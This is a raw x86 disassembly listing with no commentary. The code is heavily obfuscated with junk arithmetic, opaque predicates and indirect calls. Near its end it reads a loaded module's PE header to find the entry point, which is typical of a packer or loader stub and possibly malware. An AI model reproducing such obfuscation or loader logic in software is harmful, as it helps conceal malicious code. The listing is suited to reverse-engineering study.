  41ebd3:	mov    DWORD PTR [esp+0x3c],0x141c
  41ebdb:	add    esi,0x66a7
  41ebe1:	mov    eax,DWORD PTR [esp+0x38]
  41ebe5:	adc    DWORD PTR ds:0x4228d2,ecx
  41ebeb:	mov    ecx,DWORD PTR [esp+0x3c]
  41ebef:	mov    edx,DWORD PTR [esp+0x10]
  41ebf3:	adc    esi,0x6098
  41ebf9:	mov    esi,DWORD PTR [esp+0x14]
  41ebfd:	neg    DWORD PTR ds:0x42292e
  41ec03:	push   esi
  41ec04:	sub    DWORD PTR ds:0x42296e,0x5044
  41ec0e:	push   edx
  41ec0f:	xor    ecx,0x4611
  41ec15:	xor    eax,0x43f8
  41ec1a:	push   ecx
  41ec1b:	push   eax
  41ec1c:	call   0x421af3
  41ec21:	add    DWORD PTR ds:0x42297e,0x76c7
  41ec2b:	add    eax,0x2c3
  41ec30:	mov    DWORD PTR [esp+0x48],eax
  41ec34:	adc    edx,0x3413
  41ec3a:	mov    DWORD PTR [esp+0x4c],edx
  41ec3e:	adc    ebx,ebx
  41ec40:	mov    DWORD PTR [esp+0x48],0x53b7
  41ec48:	mov    DWORD PTR [esp+0x4c],0x3d65
  41ec50:	cmp    DWORD PTR ds:0x422922,0x0
  41ec57:	mov    ebx,DWORD PTR ds:0x4228ce
  41ec5d:	mov    esi,0x4014
  41ec62:	jmp    0x41ecd7
  41ec67:	mov    DWORD PTR ds:0x42291a,ecx
  41ec6d:	jle    0x41ecba
  41ec73:	push   0x1943
  41ec78:	push   DWORD PTR [ebp-0xc]
  41ec7b:	push   DWORD PTR [ebp-0x14]
  41ec7e:	push   0x5e2e
  41ec83:	push   0x7771
  41ec88:	push   0x1795
  41ec8d:	push   DWORD PTR [ebp-0x24]
  41ec90:	push   0x7fcf
  41ec95:	push   DWORD PTR [ebp-0x10]
  41ec98:	call   DWORD PTR ds:0x42a2c4
  41ec9e:	and    DWORD PTR ds:0x4228f6,ebx
  41eca4:	xor    ebx,esi
  41eca6:	xor    ebx,ebx
  41eca8:	xor    ebx,DWORD PTR ds:0x42295a
  41ecae:	or     ebx,DWORD PTR ds:0x4228d2
  41ecb4:	mov    DWORD PTR ds:0x42295a,ebx
  41ecba:	xor    esi,0x902
  41ecc0:	dec    DWORD PTR ds:0x4228ca
  41ecc6:	mov    ebx,DWORD PTR ds:0x4229fa
  41eccc:	mov    esi,DWORD PTR ds:0x422a42
  41ecd2:	sub    ebx,esi
  41ecd4:	add    ebx,DWORD PTR [ebx+esi*1]
  41ecd7:	mov    DWORD PTR [esp+0x48],0x3123
  41ecdf:	adc    ebx,esi
  41ece1:	mov    DWORD PTR [esp+0x4c],0x4c23
  41ece9:	mov    DWORD PTR ds:0x4228b6,0x79fc
  41ecf3:	mov    ebx,0xba699573
  41ecf8:	xor    DWORD PTR ds:0x4229be,edi
  41ecfe:	mov    DWORD PTR [esp+0x20],ebx
  41ed02:	xor    DWORD PTR ds:0x42295a,0x1cf0
  41ed0c:	mov    esi,0x9c0a89d8
  41ed11:	sbb    DWORD PTR ds:0x422896,0x240d
  41ed1b:	mov    DWORD PTR [esp+0x24],esi
  41ed1f:	add    DWORD PTR ds:0x4228d2,0x7237
  41ed29:	mov    DWORD PTR [esp+0x70],0xba699577
  41ed31:	and    DWORD PTR ds:0x4228ba,0x422966
  41ed3b:	mov    DWORD PTR [esp+0x74],esi
  41ed3f:	call   0x41a715
  41ed44:	lea    eax,[esp+0x58]
  41ed48:	xor    edx,edx
  41ed4a:	or     edx,DWORD PTR ds:0x422892
  41ed50:	sbb    DWORD PTR ds:0x4228de,edx
  41ed56:	mov    DWORD PTR [esp+0x10],eax
  41ed5a:	mov    edx,DWORD PTR ds:0x422a32
  41ed60:	mov    ecx,DWORD PTR ds:0x422a56
  41ed66:	sub    edx,ecx
  41ed68:	and    edx,DWORD PTR [edx+ecx*1]
  41ed6b:	lea    eax,[esp+0x68]
  41ed6f:	cmp    DWORD PTR ds:0x42292a,0x0
  41ed76:	mov    DWORD PTR ds:0x422992,0x1c86
  41ed80:	mov    ecx,0x3791
  41ed85:	jmp    0x41ede7
  41ed8a:	mov    ecx,0x61d6
  41ed8f:	mov    ecx,0xdc4
  41ed94:	jge    0x41edcb
  41ed9a:	push   DWORD PTR [ebp-0x28]
  41ed9d:	call   DWORD PTR ds:0x42a2c8
  41eda3:	and    DWORD PTR ds:0x4228fe,0x4228ea
  41edad:	sbb    DWORD PTR ds:0x4228a6,edx
  41edb3:	mov    ecx,DWORD PTR ds:0x4228de
  41edb9:	adc    ecx,DWORD PTR ds:0x4229aa
  41edbf:	mov    DWORD PTR ds:0x4228de,ecx
  41edc5:	inc    DWORD PTR ds:0x4228b2
  41edcb:	adc    edx,0x372b
  41edd1:	and    DWORD PTR ds:0x4229be,edx
  41edd7:	adc    DWORD PTR ds:0x4229ae,0x769d
  41ede1:	xor    DWORD PTR ds:0x422952,edx
  41ede7:	mov    DWORD PTR [esp+0x18],eax
  41edeb:	mov    eax,ds:0x422268
  41edf0:	and    DWORD PTR ds:0x422962,ecx
  41edf6:	mov    eax,DWORD PTR [eax+0x1d8]
  41edfc:	mov    eax,DWORD PTR [eax]
  41edfe:	sub    DWORD PTR ds:0x42293a,edx
  41ee04:	mov    ecx,eax
  41ee06:	cmp    DWORD PTR ds:0x422932,0x0
  41ee0d:	mov    DWORD PTR ds:0x4229c2,0xfd6
  41ee17:	mov    DWORD PTR ds:0x4229a6,edx
  41ee1d:	jmp    0x41ee63
  41ee22:	mov    DWORD PTR ds:0x422992,0x2118
  41ee2c:	jae    0x41ee4d
  41ee32:	push   0x4228a6
  41ee37:	push   0x66c0
  41ee3c:	call   DWORD PTR ds:0x42a084
  41ee42:	inc    edx
  41ee43:	sbb    DWORD PTR ds:0x4228d2,0x6891
  41ee4d:	xor    edx,0x2613
  41ee53:	sbb    edx,0x7527
  41ee59:	mov    DWORD PTR ds:0x4229d2,0x388f
  41ee63:	xor    ecx,0xa3e69a9f
  41ee69:	xor    eax,0x1
  41ee6c:	shl    eax,0x1e
  41ee6f:	mov    DWORD PTR ds:0x4229b6,0x7a6d
  41ee79:	shr    ecx,0x2
  41ee7c:	xor    edx,edx
  41ee7e:	xor    edx,DWORD PTR ds:0x42289a
  41ee84:	or     DWORD PTR ds:0x4229d2,edx
  41ee8a:	or     ecx,eax
  41ee8c:	mov    eax,DWORD PTR [esp+0x18]
  41ee90:	mov    edx,DWORD PTR ds:0x4228ce
  41ee96:	sbb    DWORD PTR ds:0x4228a6,edx
  41ee9c:	mov    DWORD PTR [eax],ecx
  41ee9e:	cmp    DWORD PTR ds:0x4229a6,0x0
  41eea5:	mov    DWORD PTR ds:0x4229b6,0x1832
  41eeaf:	mov    DWORD PTR ds:0x42296a,0x16b9
  41eeb9:	jmp    0x41ef1f
  41eebe:	mov    DWORD PTR ds:0x42290a,0x4517
  41eec8:	mov    eax,ds:0x4229ca
  41eecd:	jbe    0x41eefb
  41eed3:	push   DWORD PTR [ebp-0x10]
  41eed6:	push   DWORD PTR [ebp-0x28]
  41eed9:	push   0x51cb
  41eede:	push   DWORD PTR [ebp-0x10]
  41eee1:	call   DWORD PTR ds:0x42a2cc
  41eee7:	sbb    ecx,0x7972
  41eeed:	mov    edx,DWORD PTR ds:0x422952
  41eef3:	xor    DWORD PTR ds:0x4229a2,edx
  41eef9:	add    edx,edx
  41eefb:	mov    edx,DWORD PTR ds:0x4229e2
  41ef01:	mov    edx,DWORD PTR [edx]
  41ef03:	adc    DWORD PTR ds:0x42296e,edx
  41ef09:	sub    DWORD PTR ds:0x422992,0x5992
  41ef13:	sbb    DWORD PTR ds:0x42294e,edi
  41ef19:	neg    DWORD PTR ds:0x4228c2
  41ef1f:	lea    edi,[ebx-0x10]
  41ef22:	add    DWORD PTR ds:0x4229a6,0x146e
  41ef2c:	mov    DWORD PTR [esp+0x80],edi
  41ef33:	or     DWORD PTR ds:0x42297e,ecx
  41ef39:	mov    DWORD PTR [esp+0x84],esi
  41ef40:	mov    eax,DWORD PTR [esp+0x80]
  41ef47:	mov    ecx,DWORD PTR [esp+0x84]
  41ef4e:	sub    edx,DWORD PTR ds:0x42289a
  41ef54:	shrd   eax,ecx,0x2
  41ef58:	shr    ecx,0x2
  41ef5b:	mov    ecx,DWORD PTR [esp+0x80]
  41ef62:	adc    edx,DWORD PTR ds:0x4228d2
  41ef68:	mov    edx,DWORD PTR [esp+0x84]
  41ef6f:	adc    DWORD PTR ds:0x4228ea,0x422972
  41ef79:	xor    eax,0x2e9a655c
  41ef7e:	xor    edx,edx
  41ef80:	or     DWORD PTR ds:0x42297e,0x4228ea
  41ef8a:	or     edx,eax
  41ef8c:	mov    eax,ds:0x422268
  41ef91:	or     DWORD PTR ds:0x4229b2,0x2c69
  41ef9b:	push   edx
  41ef9c:	push   DWORD PTR [eax+0x19c]
  41efa2:	or     DWORD PTR ds:0x422922,0x4228d6
  41efac:	lea    eax,[esp+0x84]
  41efb3:	add    DWORD PTR ds:0x4228ca,0x6620
  41efbd:	push   eax
  41efbe:	shl    ecx,0x1e
  41efc1:	call   0x41d307
  41efc6:	lea    eax,[ebp+0x10]
  41efc9:	xor    DWORD PTR ds:0x422946,0x45ca
  41efd3:	push   eax
  41efd4:	and    DWORD PTR ds:0x42292a,0x42289a
  41efde:	mov    DWORD PTR [esp+0x4c],edi
  41efe2:	sbb    DWORD PTR ds:0x4228ea,0x4647
  41efec:	mov    DWORD PTR [esp+0x50],esi
  41eff0:	lea    eax,[ebp+0xc]
  41eff3:	push   eax
  41eff4:	mov    DWORD PTR ds:0x4229a2,0x343e
  41effe:	mov    DWORD PTR [esp+0x50],edi
  41f002:	lea    eax,[ebp+0x8]
  41f005:	sbb    DWORD PTR ds:0x4229a6,0x424a
  41f00f:	mov    DWORD PTR [esp+0x54],esi
  41f013:	sub    DWORD PTR ds:0x4228de,0x42288e
  41f01d:	mov    DWORD PTR [esp+0x50],edi
  41f021:	add    DWORD PTR ds:0x42298a,0x42297a
  41f02b:	mov    DWORD PTR [esp+0x54],esi
  41f02f:	push   eax
  41f030:	not    DWORD PTR ds:0x422996
  41f036:	call   0x41c168
  41f03b:	or     DWORD PTR ds:0x42299a,0x467c
  41f045:	push   0x4
  41f047:	adc    DWORD PTR ds:0x422896,0x42298a
  41f051:	push   0x4220ec
  41f056:	or     DWORD PTR ds:0x4229a2,0x42297a
  41f060:	push   DWORD PTR [esp+0x18]
  41f064:	adc    DWORD PTR ds:0x422902,0x4228b2
  41f06e:	call   0x41d307
  41f073:	mov    eax,DWORD PTR [esp+0x10]
  41f077:	adc    DWORD PTR ds:0x42293e,edi
  41f07d:	mov    ecx,DWORD PTR [esp+0x10]
  41f081:	add    edx,DWORD PTR ds:0x422962
  41f087:	mov    eax,DWORD PTR [eax]
  41f089:	cmp    DWORD PTR ds:0x422996,0x0
  41f090:	mov    DWORD PTR ds:0x422976,0x7903
  41f09a:	not    DWORD PTR ds:0x4228e2
  41f0a0:	jmp    0x41f0d4
  41f0a5:	mov    DWORD PTR ds:0x422942,edi
  41f0ab:	jle    0x41f0c8
  41f0b1:	push   DWORD PTR [ebp-0x10]
  41f0b4:	call   DWORD PTR ds:0x42a088
  41f0ba:	neg    edi
  41f0bc:	sbb    edx,DWORD PTR ds:0x422936
  41f0c2:	not    DWORD PTR ds:0x42299a
  41f0c8:	not    edi
  41f0ca:	adc    DWORD PTR ds:0x42290e,0x107e
  41f0d4:	mov    ecx,DWORD PTR [ecx]
  41f0d6:	shr    eax,0x1e
  41f0d9:	shl    ecx,0x2
  41f0dc:	or     eax,ecx
  41f0de:	mov    ecx,DWORD PTR [esp+0x10]
  41f0e2:	xor    eax,0xa3e69a9d
  41f0e7:	mov    DWORD PTR [ecx],eax
  41f0e9:	lea    eax,[esp+0x54]
  41f0ed:	mov    DWORD PTR [esp+0x94],eax
  41f0f4:	lea    eax,[esp+0x94]
  41f0fb:	mov    DWORD PTR [esp+0x90],eax
  41f102:	mov    eax,DWORD PTR [esp+0x54]
  41f106:	sub    DWORD PTR [esp+0x54],eax
  41f10a:	lea    eax,[ebp+0x4]
  41f10d:	xor    DWORD PTR [esp+0x54],eax
  41f111:	mov    DWORD PTR [esp+0x10],0x5b3d
  41f119:	mov    DWORD PTR [esp+0x14],0x4445
  41f121:	mov    DWORD PTR [esp+0x38],0xa52
  41f129:	mov    DWORD PTR [esp+0x3c],0x1c69
  41f131:	mov    eax,DWORD PTR [esp+0x38]
  41f135:	mov    ecx,DWORD PTR [esp+0x3c]
  41f139:	mov    edx,DWORD PTR [esp+0x10]
  41f13d:	mov    edi,DWORD PTR [esp+0x14]
  41f141:	add    eax,0xffffd1a5
  41f146:	adc    ecx,0xffffedf0
  41f14c:	xor    eax,edx
  41f14e:	xor    ecx,edi
  41f150:	and    eax,0x325d
  41f155:	mov    DWORD PTR [esp+0x40],eax
  41f159:	and    ecx,0x3544
  41f15f:	mov    DWORD PTR [esp+0x44],ecx
  41f163:	mov    DWORD PTR [esp+0x18],0x1704
  41f16b:	mov    DWORD PTR [esp+0x1c],0x4a75
  41f173:	mov    DWORD PTR [esp+0x10],0x985
  41f17b:	mov    DWORD PTR [esp+0x14],0x341
  41f183:	mov    DWORD PTR [esp+0x38],0x5aa9
  41f18b:	mov    DWORD PTR [esp+0x3c],0x221a
  41f193:	mov    eax,DWORD PTR [esp+0x38]
  41f197:	mov    ecx,DWORD PTR [esp+0x3c]
  41f19b:	mov    edx,DWORD PTR [esp+0x10]
  41f19f:	mov    edi,DWORD PTR [esp+0x14]
  41f1a3:	push   edi
  41f1a4:	push   edx
  41f1a5:	or     ecx,0xc32
  41f1ab:	or     eax,0x502a
  41f1b0:	push   ecx
  41f1b1:	push   eax
  41f1b2:	call   0x41dfae
  41f1b7:	mov    ecx,DWORD PTR [esp+0x18]
  41f1bb:	mov    edi,DWORD PTR [esp+0x1c]
  41f1bf:	sub    eax,ecx
  41f1c1:	mov    ecx,DWORD PTR [esp+0x40]
  41f1c5:	sbb    edx,edi
  41f1c7:	mov    edi,DWORD PTR [esp+0x44]
  41f1cb:	cmp    ecx,eax
  41f1cd:	jne    0x41f1db
  41f1d3:	cmp    edi,edx
  41f1d5:	je     0x41f69a
  41f1db:	mov    DWORD PTR [esp+0x10],0x71ba
  41f1e3:	mov    DWORD PTR [esp+0x14],0x5f78
  41f1eb:	mov    DWORD PTR [esp+0x38],0x7b9c
  41f1f3:	mov    DWORD PTR [esp+0x3c],0x5622
  41f1fb:	mov    eax,DWORD PTR [esp+0x38]
  41f1ff:	mov    ecx,DWORD PTR [esp+0x3c]
  41f203:	mov    edx,DWORD PTR [esp+0x10]
  41f207:	mov    edi,DWORD PTR [esp+0x14]
  41f20b:	add    eax,0x3646
  41f210:	adc    ecx,0x7ace
  41f216:	xor    eax,0x3e2e
  41f21b:	xor    ecx,0x4b71
  41f221:	and    eax,edx
  41f223:	mov    DWORD PTR [esp+0x48],eax
  41f227:	and    ecx,edi
  41f229:	mov    DWORD PTR [esp+0x4c],ecx
  41f22d:	mov    DWORD PTR [esp+0x40],0x18d6
  41f235:	mov    DWORD PTR [esp+0x44],0x2bb4
  41f23d:	mov    DWORD PTR [esp+0x18],0x14
  41f245:	mov    DWORD PTR [esp+0x1c],0x0
  41f24d:	mov    DWORD PTR [esp+0x10],0x1
  41f255:	mov    DWORD PTR [esp+0x14],0x0
  41f25d:	mov    DWORD PTR [esp+0x38],0xa87
  41f265:	mov    DWORD PTR [esp+0x3c],0x7fd9
  41f26d:	mov    eax,DWORD PTR [esp+0x38]
  41f271:	mov    ecx,DWORD PTR [esp+0x3c]
  41f275:	push   0x2
  41f277:	push   0x7f349462
  41f27c:	xor    ecx,0x3601
  41f282:	xor    eax,0x5491
  41f287:	push   ecx
  41f288:	push   eax
  41f289:	call   0x421af3
  41f28e:	mov    ecx,DWORD PTR [esp+0x10]
  41f292:	mov    edi,DWORD PTR [esp+0x14]
  41f296:	push   edi
  41f297:	push   ecx
  41f298:	push   edx
  41f299:	push   eax
  41f29a:	call   0x421af3
  41f29f:	mov    ecx,DWORD PTR [esp+0x18]
  41f2a3:	mov    edi,DWORD PTR [esp+0x1c]
  41f2a7:	push   edi
  41f2a8:	push   ecx
  41f2a9:	push   edx
  41f2aa:	push   eax
  41f2ab:	call   0x421af3
  41f2b0:	mov    ecx,DWORD PTR [esp+0x40]
  41f2b4:	mov    edi,DWORD PTR [esp+0x44]
  41f2b8:	add    eax,ecx
  41f2ba:	mov    ecx,DWORD PTR [esp+0x48]
  41f2be:	adc    edx,edi
  41f2c0:	mov    edi,DWORD PTR [esp+0x4c]
  41f2c4:	cmp    ecx,eax
  41f2c6:	jne    0x41f2d4
  41f2cc:	cmp    edi,edx
  41f2ce:	je     0x41f69a
  41f2d4:	mov    eax,DWORD PTR [esp+0x54]
  41f2d8:	mov    edx,DWORD PTR [esp+0x20]
  41f2dc:	mov    edi,DWORD PTR [esp+0x24]
  41f2e0:	xor    ecx,ecx
  41f2e2:	shld   ecx,eax,0x2
  41f2e6:	shl    eax,0x2
  41f2e9:	xor    eax,ebx
  41f2eb:	xor    ecx,esi
  41f2ed:	cmp    eax,edx
  41f2ef:	jne    0x41f2fd
  41f2f5:	cmp    ecx,edi
  41f2f7:	je     0x41f69a
  41f2fd:	mov    eax,DWORD PTR [esp+0x58]
  41f301:	cmp    eax,0xa3e69a99
  41f306:	je     0x41f35d
  41f30c:	mov    eax,DWORD PTR [esp+0x20]
  41f310:	mov    ecx,DWORD PTR [esp+0x24]
  41f314:	mov    edx,DWORD PTR [esp+0x20]
  41f318:	mov    edi,DWORD PTR [esp+0x24]
  41f31c:	xor    edi,esi
  41f31e:	xor    edx,ebx
  41f320:	shrd   edx,edi,0x2
  41f324:	mov    ecx,eax
  41f326:	shr    edi,0x2
  41f329:	xor    eax,eax
  41f32b:	mov    DWORD PTR [esp+0x10],edi
  41f32f:	mov    edi,edx
  41f331:	or     edi,eax
  41f333:	mov    eax,DWORD PTR [esp+0x10]
  41f337:	shl    ecx,0x1e
  41f33a:	xor    ecx,0xc0000000
  41f340:	or     eax,ecx
  41f342:	mov    DWORD PTR [esp+0x4c],eax
  41f346:	mov    eax,DWORD PTR [esp+0x68]
  41f34a:	cdq    
  41f34b:	cmp    edi,eax
  41f34d:	jne    0x41f69a
  41f353:	cmp    DWORD PTR [esp+0x4c],edx
  41f357:	jne    0x41f69a
  41f35d:	mov    DWORD PTR [esp+0x64],0x422304
  41f365:	mov    DWORD PTR [esp+0x6c],0x4222fc
  41f36d:	mov    eax,DWORD PTR [esp+0x7c]
  41f371:	mov    eax,DWORD PTR [esp+0x7c]
  41f375:	mov    edx,DWORD PTR [esp+0x20]
  41f379:	mov    edi,DWORD PTR [esp+0x24]
  41f37d:	xor    ecx,ecx
  41f37f:	shld   ecx,eax,0x2
  41f383:	shl    eax,0x2
  41f386:	xor    eax,ebx
  41f388:	xor    ecx,esi
  41f38a:	cmp    edx,eax
  41f38c:	jne    0x41f5aa
  41f392:	cmp    edi,ecx
  41f394:	jne    0x41f5aa
  41f39a:	mov    DWORD PTR [esp+0x10],0x42228c
  41f3a2:	mov    ecx,DWORD PTR [esp+0x20]
  41f3a6:	mov    eax,DWORD PTR [esp+0x24]
  41f3aa:	shrd   ecx,eax,0x2
  41f3ae:	shr    eax,0x2
  41f3b1:	mov    eax,DWORD PTR [esp+0x20]
  41f3b5:	mov    edx,DWORD PTR [esp+0x24]
  41f3b9:	shl    eax,0x1e
  41f3bc:	mov    edi,0x2e9a655c
  41f3c1:	xor    ecx,edi
  41f3c3:	xor    eax,eax
  41f3c5:	or     eax,ecx
  41f3c7:	mov    ecx,DWORD PTR [esp+0x10]
  41f3cb:	mov    ecx,DWORD PTR [ecx+0xc]
  41f3ce:	cmp    eax,DWORD PTR [ecx]
  41f3d0:	jne    0x41f549
  41f3d6:	mov    eax,0x65c7
  41f3db:	mov    WORD PTR [esp+0x40],ax
  41f3e0:	mov    eax,0x6062
  41f3e5:	mov    WORD PTR [esp+0x18],ax
  41f3ea:	mov    eax,0x125d
  41f3ef:	mov    WORD PTR [esp+0x10],ax
  41f3f4:	movzx  eax,WORD PTR [esp+0x10]
  41f3f9:	mov    ecx,0x2d0f
  41f3fe:	and    ax,cx
  41f401:	mov    cx,WORD PTR [esp+0x18]
  41f406:	or     ax,cx
  41f409:	mov    cx,WORD PTR [esp+0x40]
  41f40e:	add    ax,cx
  41f411:	or     eax,0x3b22
  41f416:	mov    WORD PTR [esp+0x30],ax
  41f41b:	mov    eax,0x57d4
  41f420:	mov    WORD PTR [esp+0x40],ax
  41f425:	mov    eax,0x3b21
  41f42a:	mov    WORD PTR [esp+0x2c],ax
  41f42f:	mov    eax,0x52fd
  41f434:	mov    WORD PTR [esp+0x18],ax
  41f439:	mov    eax,0x2ce0
  41f43e:	mov    WORD PTR [esp+0x10],ax
  41f443:	mov    ax,WORD PTR [esp+0x10]
  41f448:	mov    cx,WORD PTR [esp+0x18]
  41f44d:	or     ax,cx
  41f450:	mov    ecx,0x21a4
  41f455:	or     ax,cx
  41f458:	mov    cx,WORD PTR [esp+0x40]
  41f45d:	sub    ax,cx
  41f460:	mov    cx,WORD PTR [esp+0x2c]
  41f465:	sub    ax,cx
  41f468:	mov    cx,WORD PTR [esp+0x30]
  41f46d:	cmp    cx,ax
  41f470:	jbe    0x41f549
  41f476:	mov    eax,0x5008
  41f47b:	mov    WORD PTR [esp+0x18],ax
  41f480:	mov    eax,0x60ce
  41f485:	mov    WORD PTR [esp+0x10],ax
  41f48a:	movzx  eax,WORD PTR [esp+0x10]
  41f48f:	mov    ecx,0x2095
  41f494:	or     ax,cx
  41f497:	mov    cx,WORD PTR [esp+0x18]
  41f49c:	sub    ax,cx
  41f49f:	mov    ecx,0x10de
  41f4a4:	or     eax,0x742f
  41f4a9:	imul   eax,eax,0x30b2
  41f4af:	mov    WORD PTR [esp+0x30],ax
  41f4b4:	mov    eax,0x6143
  41f4b9:	mov    WORD PTR [esp+0x2c],ax
  41f4be:	mov    eax,0x679f
  41f4c3:	mov    WORD PTR [esp+0x40],ax
  41f4c8:	mov    eax,0x1210
  41f4cd:	mov    WORD PTR [esp+0x18],ax
  41f4d2:	mov    eax,0x3308
  41f4d7:	mov    WORD PTR [esp+0x10],ax
  41f4dc:	mov    ax,WORD PTR [esp+0x10]
  41f4e1:	sub    ax,cx
  41f4e4:	mov    cx,WORD PTR [esp+0x18]
  41f4e9:	xor    ax,cx
  41f4ec:	mov    cx,WORD PTR [esp+0x40]
  41f4f1:	imul   ax,cx
  41f4f5:	mov    cx,WORD PTR [esp+0x2c]
  41f4fa:	and    ax,cx
  41f4fd:	mov    ecx,0x694c
  41f502:	and    ax,cx
  41f505:	mov    cx,WORD PTR [esp+0x30]
  41f50a:	cmp    cx,ax
  41f50d:	ja     0x41f549
  41f513:	mov    eax,DWORD PTR [esp+0x20]
  41f517:	mov    ecx,DWORD PTR [esp+0x24]
  41f51b:	shrd   eax,ecx,0x2
  41f51f:	shr    ecx,0x2
  41f522:	mov    ecx,DWORD PTR [esp+0x20]
  41f526:	mov    edx,DWORD PTR [esp+0x24]
  41f52a:	xor    eax,edi
  41f52c:	xor    edx,edx
  41f52e:	or     edx,eax
  41f530:	push   edx
  41f531:	push   esi
  41f532:	push   0xba699563
  41f537:	lea    eax,[esp+0x7c]
  41f53b:	push   eax
  41f53c:	lea    eax,[esp+0x30]
  41f540:	push   eax
  41f541:	shl    ecx,0x1e
  41f544:	call   0x41d28f
  41f549:	push   DWORD PTR [esp+0x74]
  41f54d:	push   DWORD PTR [esp+0x74]
  41f551:	push   DWORD PTR [esp+0x2c]
  41f555:	push   DWORD PTR [esp+0x2c]
  41f559:	call   0x41d463
  41f55e:	mov    ecx,DWORD PTR [esp+0x20]
  41f562:	mov    eax,DWORD PTR [esp+0x24]
  41f566:	shrd   ecx,eax,0x2
  41f56a:	shr    eax,0x2
  41f56d:	mov    eax,DWORD PTR [esp+0x20]
  41f571:	mov    edx,DWORD PTR [esp+0x24]
  41f575:	shl    eax,0x1e
  41f578:	xor    eax,eax
  41f57a:	xor    ecx,edi
  41f57c:	or     eax,ecx
  41f57e:	mov    ecx,DWORD PTR [esp+0x64]
  41f582:	mov    DWORD PTR [ecx],eax
  41f584:	mov    ecx,DWORD PTR [esp+0x20]
  41f588:	mov    eax,DWORD PTR [esp+0x24]
  41f58c:	shrd   ecx,eax,0x2
  41f590:	shr    eax,0x2
  41f593:	mov    eax,DWORD PTR [esp+0x20]
  41f597:	mov    edx,DWORD PTR [esp+0x24]
  41f59b:	shl    eax,0x1e
  41f59e:	xor    ecx,edi
  41f5a0:	xor    eax,eax
  41f5a2:	or     eax,ecx
  41f5a4:	mov    ecx,DWORD PTR [esp+0x6c]
  41f5a8:	mov    DWORD PTR [ecx],eax
  41f5aa:	mov    eax,DWORD PTR [esp+0x6c]
  41f5ae:	mov    ecx,DWORD PTR [esp+0x6c]
  41f5b2:	mov    eax,DWORD PTR [eax]
  41f5b4:	cmp    eax,DWORD PTR [ecx]
  41f5b6:	jne    0x41f67e
  41f5bc:	mov    eax,DWORD PTR [esp+0x64]
  41f5c0:	mov    ecx,DWORD PTR [esp+0x64]
  41f5c4:	mov    eax,DWORD PTR [eax]
  41f5c6:	cmp    eax,DWORD PTR [ecx]
  41f5c8:	jne    0x41f67e
  41f5ce:	mov    BYTE PTR [esp+0x40],0x20
  41f5d3:	mov    BYTE PTR [esp+0x2c],0x3
  41f5d8:	mov    BYTE PTR [esp+0x30],0x6d
  41f5dd:	mov    BYTE PTR [esp+0x37],0x90
  41f5e2:	mov    al,BYTE PTR [esp+0x37]
  41f5e6:	mov    cl,BYTE PTR [esp+0x30]
  41f5ea:	or     al,0xdc
  41f5ec:	sub    al,cl
  41f5ee:	mov    cl,BYTE PTR [esp+0x2c]
  41f5f2:	sub    al,0x56
  41f5f4:	movzx  eax,al
  41f5f7:	movzx  ecx,cl
  41f5fa:	cdq    
  41f5fb:	idiv   ecx
  41f5fd:	movzx  ecx,BYTE PTR [esp+0x40]
  41f602:	or     eax,ecx
  41f604:	mov    BYTE PTR [esp+0x10],al
  41f608:	mov    BYTE PTR [esp+0x18],0x1
  41f60d:	mov    BYTE PTR [esp+0x37],0xcf
  41f612:	mov    BYTE PTR [esp+0x30],0x6
  41f617:	mov    BYTE PTR [esp+0x2c],0x25
  41f61c:	mov    BYTE PTR [esp+0x40],0xf8
  41f621:	mov    al,BYTE PTR [esp+0x40]
  41f625:	mov    cl,BYTE PTR [esp+0x2c]
  41f629:	or     al,0xc4
  41f62b:	and    al,cl
  41f62d:	mov    cl,BYTE PTR [esp+0x30]
  41f631:	imul   cl
  41f633:	mov    cl,BYTE PTR [esp+0x37]
  41f637:	movzx  ecx,cl
  41f63a:	movzx  eax,al
  41f63d:	and    eax,ecx
  41f63f:	mov    cl,BYTE PTR [esp+0x18]
  41f643:	movzx  ecx,cl
  41f646:	cdq    
  41f647:	idiv   ecx
  41f649:	mov    cl,BYTE PTR [esp+0x10]
  41f64d:	cmp    cl,al
  41f64f:	je     0x41f69a
  41f655:	lea    eax,[esp+0x90]
  41f65c:	push   eax
  41f65d:	lea    edi,[esp+0x90]
  41f664:	call   0x41c4c1
  41f669:	cmp    eax,ebx
  41f66b:	jne    0x41f69a
  41f671:	cmp    edx,esi
  41f673:	jne    0x41f69a
  41f679:	jmp    0x41e200
  41f67e:	mov    eax,DWORD PTR [esp+0x70]
  41f682:	mov    ecx,DWORD PTR [esp+0x74]
  41f686:	mov    edx,DWORD PTR [esp+0x20]
  41f68a:	mov    edi,DWORD PTR [esp+0x24]
  41f68e:	add    eax,edx
  41f690:	adc    ecx,edi
  41f692:	mov    DWORD PTR [esp+0x20],eax
  41f696:	mov    DWORD PTR [esp+0x24],ecx
  41f69a:	push   0x4
  41f69c:	push   0x422268
  41f6a1:	lea    eax,[esp+0x64]
  41f6a5:	push   eax
  41f6a6:	call   0x41d307
  41f6ab:	mov    eax,DWORD PTR [esp+0x5c]
  41f6af:	push   0x4
  41f6b1:	push   DWORD PTR [eax+0x1a4]
  41f6b7:	lea    eax,[esp+0x68]
  41f6bb:	push   eax
  41f6bc:	call   0x41d307
  41f6c1:	mov    eax,DWORD PTR [esp+0x5c]
  41f6c5:	mov    eax,DWORD PTR [eax+0x1a4]
  41f6cb:	mov    eax,DWORD PTR [eax]
  41f6cd:	mov    ecx,DWORD PTR [esp+0x5c]
  41f6d1:	mov    eax,DWORD PTR [eax+0x3c]
  41f6d4:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41f6da:	mov    ecx,DWORD PTR [ecx]
  41f6dc:	lea    eax,[ecx+eax*1+0x28]
  41f6e0:	mov    eax,DWORD PTR [eax]
  41f6e2:	add    DWORD PTR [esp+0x60],eax
  41f6e6:	mov    DWORD PTR [esp+0x18],0x127
  41f6ee:	mov    DWORD PTR [esp+0x10],0x421a
  41f6f6:	mov    eax,DWORD PTR [esp+0x10]
  41f6fa:	and    eax,0xffffc244
  41f6ff:	add    eax,DWORD PTR [esp+0x18]
  41f703:	and    eax,0xfffffe5a
  41f708:	sub    eax,0x2ae1
  41f70d:	and    eax,0x6f90
  41f712:	mov    DWORD PTR [esp+0x18],eax
  41f716:	mov    DWORD PTR [esp+0x10],0x1515
  41f71e:	mov    eax,DWORD PTR [esp+0x10]
  41f722:	mov    ecx,DWORD PTR [esp+0x18]
  41f726:	or     eax,0x7113
  41f72b:	add    eax,0x3d6a
  41f730:	cmp    ecx,eax
  41f732:	je     0x41f822
  41f738:	mov    eax,DWORD PTR [esp+0x54]
  41f73c:	mov    edx,DWORD PTR [esp+0x20]
  41f740:	mov    edi,DWORD PTR [esp+0x24]
  41f744:	xor    ecx,ecx
